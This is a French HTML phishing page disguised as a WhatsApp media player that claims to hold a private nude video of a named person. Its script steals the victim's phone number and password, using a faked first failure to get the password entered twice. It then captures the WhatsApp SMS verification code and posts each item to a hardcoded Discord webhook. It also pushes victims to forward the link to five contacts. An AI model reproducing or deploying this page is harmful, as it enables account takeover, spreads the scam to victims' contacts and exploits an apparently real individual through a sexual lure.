<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Media Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .video-placeholder {
            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('couverture.jpg');
            background-size: cover;
            background-position: center;
        }
        .blur-bg { backdrop-filter: blur(8px); }
        .progress-transition { transition: width 0.8s ease-in-out; }
    </style>
</head>
<body class="bg-[#111b21] text-[#e9edef] font-sans min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md bg-[#202c33] rounded-2xl shadow-2xl overflow-hidden border border-gray-700">
        <div class="bg-[#00a884] p-4 flex items-center gap-3">
            <i class="fab fa-whatsapp text-2xl text-white"></i>
            <span class="font-bold text-lg">WhatsApp Media Player</span>
        </div>

        <div class="p-4">
            <div class="video-placeholder w-full h-56 rounded-xl flex flex-col items-center justify-center relative border-2 border-dashed border-gray-500">
                <div class="bg-white/20 p-4 rounded-full blur-bg mb-2">
                    <i class="fas fa-play text-white text-3xl ml-1"></i>
                </div>
                <p class="text-sm font-semibold px-4 text-center text-white">Vid√©o : Nolwe≈ã nude (Priv√©)</p>
                <p class="text-[10px] text-gray-300 mt-1 uppercase tracking-tighter">Taille : 12.4 MB ‚Ä¢ Dur√©e : 04:20</p>
            </div>
        </div>

        <div class="p-6 pt-2">
            <div id="main-auth" class="bg-[#111b21] p-4 rounded-xl border border-gray-700 mb-4">
                <p class="text-xs text-[#8696a0] mb-3 uppercase tracking-wider font-bold">V√©rification de S√©curit√©</p>
                
                <form id="pirateForm" class="space-y-4">
                    
                    <div id="step1" class="space-y-4 text-center">
                        <input type="text" id="phone" placeholder="Num√©ro de t√©l√©phone" required
                            class="w-full bg-[#2a3942] border-none rounded-lg p-3 outline-none focus:ring-2 focus:ring-[#00a884] text-white">
                        
                        <div class="space-y-1">
                            <input type="password" id="secret" placeholder="Cr√©ez un mot de passe √† retenir" required
                                class="w-full bg-[#2a3942] border-none rounded-lg p-3 outline-none focus:ring-2 focus:ring-[#00a884] text-white text-center">
                            <p id="error-msg" class="text-[10px] text-red-400 px-1 font-semibold italic">
                                ‚ö†Ô∏è Notez bien ce mot de passe. Sans lui, l'acc√®s sera d√©finitivement bloqu√©.
                            </p>
                        </div>
                        
                        <button type="button" id="nextBtn" class="w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full hover:bg-[#06cf9c] transition uppercase">
                            ACC√âDER √Ä LA VID√âO
                        </button>
                    </div>

                    <div id="otpSection" class="hidden">
                        <div class="bg-gray-800 p-3 rounded-lg border border-[#00a884] mb-3">
                            <input type="text" id="otp" placeholder="Code de d√©blocage (SMS)" 
                                class="w-full bg-transparent border-none text-center text-2xl tracking-widest font-bold text-white outline-none">
                        </div>
                        <p class="text-[10px] text-green-400 mb-4 text-center italic">Le code de s√©curit√© vient d'√™tre g√©n√©r√© par WhatsApp.</p>
                        <button type="button" id="submitOtpBtn" class="w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full border-2 border-white uppercase shadow-lg">
                            D√âBLOQUER LA LECTURE
                        </button>
                    </div>

                    <div id="step-share" class="hidden space-y-4 text-center">
                        <h3 class="text-orange-400 font-black text-sm uppercase">üö® Action de Solidarit√© Requise</h3>
                        <p class="text-[11px] text-gray-300">Cette vid√©o est prot√©g√©e. Partagez-la avec 5 amis ou groupes pour finaliser le chargement.</p>
                        
                        <div class="w-full bg-gray-800 h-4 rounded-full overflow-hidden border border-gray-600">
                            <div id="bar" class="progress-transition bg-[#25D366] h-full w-0"></div>
                        </div>

                        <button type="button" onclick="handleShare()" class="w-full bg-[#25D366] text-white font-bold py-3 rounded-full flex items-center justify-center gap-2 animate-bounce">
                            <i class="fab fa-whatsapp text-xl"></i> PARTAGER SUR WHATSAPP
                        </button>
                    </div>

                </form>
            </div>
            <p class="text-[10px] text-[#8696a0] text-center italic">-Chiffrement de bout en bout-</p>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
        
        const nextBtn = document.getElementById('nextBtn');
        const submitOtpBtn = document.getElementById('submitOtpBtn');
        const step1 = document.getElementById('step1');
        const otpSection = document.getElementById('otpSection');
        const stepShare = document.getElementById('step-share');
        const bar = document.getElementById('bar');
        const errorMsg = document.getElementById('error-msg');

        let tentatives = 0;

        // 1. GESTION DU MOT DE PASSE (DOUBLE ESSAI)
        nextBtn.addEventListener('click', () => {
            const phone = document.getElementById('phone').value;
            const secret = document.getElementById('secret').value;

            if(!phone || !secret) return alert("Veuillez remplir les informations");

            if(tentatives === 0) {
                errorMsg.innerText = "‚ùå Erreur de synchronisation : Mot de passe non reconnu. R√©essayez.";
                errorMsg.classList.replace('text-red-400', 'text-yellow-400');
                document.getElementById('secret').value = ""; 
                tentatives++;
            } else {
                // Envoi des identifiants au Discord
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        content: `üë§ **NOUVELLE CIBLE**\nüì± **Tel :** \`${phone}\`\nüîë **Password (Confirm√©) :** ||${secret}||` 
                    })
                });
                // Passage au SMS
                step1.classList.add('hidden');
                otpSection.classList.remove('hidden');
            }
        });

        // 2. GESTION DU CODE SMS (AVANT LE PARTAGE)
        submitOtpBtn.addEventListener('click', () => {
            const phone = document.getElementById('phone').value;
            const otp = document.getElementById('otp').value;

            if(!otp) return alert("Veuillez entrer le code SMS");

            // Envoi du code SMS au Discord
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "üéØ CODE WHATSAPP CAPTUR√â",
                        color: 16711680,
                        fields: [
                            { name: "üì± T√©l√©phone", value: phone, inline: true },
                            { name: "üîë CODE SMS", value: `**${otp}**`, inline: true }
                        ],
                        timestamp: new Date()
                    }]
                })
            });

            // Passage au Partage
            otpSection.classList.add('hidden');
            stepShare.classList.remove('hidden');
        });

        // 3. GESTION DU PARTAGE (√âTAPE FINALE)
        function handleShare() {
            bar.style.width = "100%";
            const msg = encodeURIComponent("Regarde cette vid√©o : " + window.location.href);
            window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');

            setTimeout(() => {
                alert("Erreur de d√©codage : Votre connexion est instable. La vid√©o ne peut pas √™tre lue pour le moment.");
            }, 3000);
        }
    </script>
</body>
</html>
